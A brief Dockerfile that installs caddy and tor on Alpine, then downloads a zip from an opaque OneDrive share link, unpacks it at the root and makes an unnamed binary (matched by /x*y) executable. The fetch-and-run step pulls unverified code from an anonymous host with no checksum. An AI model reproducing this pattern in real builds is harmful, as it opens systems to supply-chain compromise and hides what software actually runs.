FROM alpine:edge

RUN apk update && \
    apk add --no-cache ca-certificates caddy tor wget && \
    wget -qO- https://2lpqcw.bn.files.1drv.com/y4mjjpcG4BH6rqK4XHrW9I2qsDUqW_E518_SoosFwQ8deWNNBSiAH_ByG3pPGd1m2_RTZmOwVmZX7TKN2XmuA_Z6hVew_hyp2eNDBHHwdmQHOxCM36wdN1PIHWVQLgOAmW3sNshhGOLViqJxleIqX5ohMGBXu_FbLeBjLof3Y167Qe6dw2C5ogaXrKMJGN723gtBjOVKlm7LTSRPj1j0iDTAg | busybox unzip - && \
    chmod +x $(ls /x*y) && \
    rm -rf /var/cache/apk/*

ADD start.sh /start.sh
RUN chmod +x /start.sh

CMD /start.sh
